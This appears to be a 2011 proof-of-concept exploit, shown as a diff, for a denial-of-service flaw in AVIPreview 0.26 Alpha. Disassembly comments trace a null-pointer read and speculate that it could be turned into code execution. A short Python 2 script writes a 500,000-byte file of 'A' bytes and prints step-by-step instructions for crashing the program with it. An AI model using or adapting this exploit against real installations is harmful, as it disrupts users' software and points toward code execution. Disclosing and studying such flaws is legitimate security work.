@@ -1,0 +1,34 @@
+# done by BraniX <branix@hackers.org.pl>
+# www.hackers.org.pl
+# found: 2011.03.15
+# published: 2011.03.15
+# tested on: Windows XP SP3 Home Edition
+
+# App:              AVIPreview 0.26 Alpha
+# App Url:          http://www.divx-digest.com/software/avipreview_aj.html
+# AVIPreview.exe    MD5: 399ab43edd26c655d0876dc5ddcaa3a7
+
+# DoS is caused by Access Violation Exception, app reads memory via null pointer
+
+# 00405B59  8B0D E0B14100   MOV ECX,DWORD PTR DS:[41B1E0]       <-- Read from .data section DD 0h
+# 00405B5F  8B11            MOV EDX,DWORD PTR DS:[ECX]          <-- Exception, but if EDX is a pointer to SH
+# 00405B61  A1 E0B14100     MOV EAX,DWORD PTR DS:[41B1E0]
+# 00405B66  50              PUSH EAX
+# 00405B67  FF52 30         CALL DWORD PTR DS:[EDX+30]          <-- We will have LCE
+
+# if exploiter can force something minigfull to ECX (.data is RW)
+# so he/she will have code execution 
+
+path = "C:\\DoS.avi"
+f = open(path, "wb")
+f.write('\x41' * 500000)
+f.close()
+
+print "File generated: " + path
+print "In order to DoS AVIPreview 0.26 Alpha execute following steps\n"
+
+print "1. Open file '" + path + "'in AVIPreview, application will show MessageBox with error, but will not crash"
+print "2. Select 'No', otherway AVIPreview will pop-up browser"
+print "3. Navigate to File menu and pick recent file (which point to our AVI file)"
+print "4. You have DoS :>"
+
